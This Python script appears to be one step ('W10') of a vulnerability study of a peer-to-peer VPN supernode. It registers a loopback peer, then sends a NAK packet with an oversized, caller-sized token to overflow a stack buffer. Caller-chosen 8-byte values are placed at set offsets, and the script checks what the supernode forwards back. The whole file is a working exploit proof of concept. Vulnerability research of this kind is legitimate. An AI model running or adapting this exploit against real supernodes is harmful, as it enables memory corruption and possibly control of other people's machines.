#!/usr/bin/env python3
"""W10: register a loopback peer, then send an oversized-token NAK.

Same wire construction as w3_peer_forward.py but the token size is a CLI
argument, so the forward overflow can reach frame slots further from &nak.
Controlled by the caller; loopback only.
"""
import socket
import struct
import sys
import time

SN_PORT = int(sys.argv[1])
PEER_PORT = int(sys.argv[2])
TOKEN_SIZE = int(sys.argv[3]) if len(sys.argv) > 3 else 96
OVERRIDES = []
for pair in sys.argv[4:]:
    off, val = pair.split(':')
    OVERRIDES.append((int(off), int(val, 0).to_bytes(8, 'little')))
COMMUNITY = b"mynetwork".ljust(20, b"\0")
MAC = bytes([2, 0, 0, 0, 0, 1])
COOKIE = 0x11223344


def common(msg_type):
    return bytes([3, 3]) + struct.pack("!H", msg_type) + COMMUNITY


def recv(sock, seconds):
    sock.settimeout(seconds)
    try:
        return sock.recvfrom(4096)
    except socket.timeout:
        return None


peer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
peer.bind(("127.0.0.1", PEER_PORT))
time.sleep(5)

register = (common(5) + struct.pack("!I", COOKIE) + MAC
            + struct.pack("!I", 0) + bytes([0]) + bytes(16)
            + struct.pack("!HH", 0, 0) + struct.pack("!I", 0))
peer.sendto(register, ("127.0.0.1", SN_PORT))
reply = recv(peer, 4)
if reply is None:
    print("W10: no REGISTER_SUPER reply", flush=True)
else:
    print(f"W10: REGISTER_SUPER reply len={len(reply[0])}", flush=True)

token = bytearray([0x48, 0x5a, 0x4d, 0x49]) * (TOKEN_SIZE // 4)
for off, raw in OVERRIDES:
    token[off:off + 8] = raw
    print(f"W10: override token+{off} = {raw.hex()}", flush=True)
nak = (common(8) + struct.pack("!I", COOKIE) + MAC
       + struct.pack("!HH", 0, TOKEN_SIZE) + bytes(token))
assert len(nak) == 38 + TOKEN_SIZE
sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sender.sendto(nak, ("127.0.0.1", SN_PORT))
sender.close()
print(f"W10: sent NAK len={len(nak)} token_size={TOKEN_SIZE}", flush=True)

for _ in range(25):
    reply = recv(peer, 1)
    if reply is None:
        continue
    data = reply[0]
    wire_token = data[38:]
    print(f"W10: FORWARDED len={len(data)} token_len={len(wire_token)} "
          f"first={wire_token[:8].hex()} beyond48={wire_token[48:56].hex()}",
          flush=True)
    break
else:
    print("W10: no forwarded NAK", flush=True)
